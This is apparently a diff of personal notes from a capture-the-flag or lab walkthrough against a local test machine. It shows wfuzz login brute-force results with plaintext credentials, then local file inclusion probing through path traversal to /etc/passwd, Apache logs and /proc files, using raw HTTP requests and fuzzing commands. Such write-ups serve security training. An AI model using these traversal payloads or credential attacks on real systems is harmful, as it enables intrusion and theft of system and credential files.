@@ -178,7 +178,7 @@ ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
 000000016:   200        50 L     93 W       1248 Ch     "scoots - YR3BVxxxw87"                                                                    
-000000001:   302        50 L     87 W       1210 Ch     "admin - transorbital1"                                                                   
+302 [redirect response tells me this worked]>>>>>> 000000001:   302        50 L     87 W       1210 Ch     "admin - transorbital1"                                                                   
 000000002:   200        50 L     93 W       1248 Ch     "marym - 3kfs86sfd"                                                                       
 000000005:   200        50 L     93 W       1248 Ch     "barneyr - RocksOff"                                                                      
 000000008:   200        50 L     93 W       1248 Ch     "wilmaf - Pebbles"                                                                        
@@ -195,3 +195,92 @@ ID           Response   Lines    Word       Chars       Payload
 000000011:   200        50 L     93 W       1248 Ch     "joeyt - Passw0rd"                                                                        
 000000012:   200        50 L     93 W       1248 Ch     "rachelg - yN72#dsd"                                                                      
 000000010:   200        50 L     93 W       1248 Ch     "chandlerb - UrAG0D!"                                                                     
+
+9. Logging in as admin and taking a look around
+
+On login there is a message stating "file does not exist" 
+- http://10.0.2.4/addrecord.php this page allows me to add a new record into the DB. 
+
+- Going to fuzz http://10.0.2.4/manage.php to see if I can sort out what file it is looking for. 
+- NOTE: wfuzz in this instance needs the PHPSESSION to be passed into it
+-- reference: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+
+- LFI test: 
+┌──(kali㉿kali)-[/usr/share]
+└─$ wfuzz -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -c -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.0.2.4/manage.php?FUZZ=../../../../../../../../../../../../../etc/passwd
+
+-b == cookie 
+--hw == hide word count (in this case 100 == failed result after prvious testing)
+- c == colors
+- w == wordlist (using something from SecLists)
+- ../../../../../../../../../../../../../etc/passwd (init test for LFI to see if passwd comes back)
+
+- Testing result in the burp: 
+
+GET /manage.php?file=../../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response in passwd
+
+10. explore LFI 
+- look for log file
+Request: 
+GET /manage.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: File does not exist
+
+- test for code execution
+- searching through the /proc/self directory to gain info on what PID this user is: 
+Request: 
+GET /manage.php?file=../../../../../../../../../../../../../proc/self/cmdline HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: 
+<br />/usr/sbin/apache2-kstart	
+Going to fuzz the /proc/self/fd directory (this is where processes are listed for the above user)
+
+┌──(kali㉿kali)-[/proc/self/fd]
+└─$ wfuzz -z range,0-100 -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -u http://10.0.2.4/manage.php?file=../../../../../../../../../../../../../proc/self/fd/FUZZ
+
+- The above returns nothing. 
+
+- Look at /proc/sched_debug
+Request: 
+
+GET /manage.php?file=../../../../../../../../../../../../../proc/sched_debug HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: sched_debug
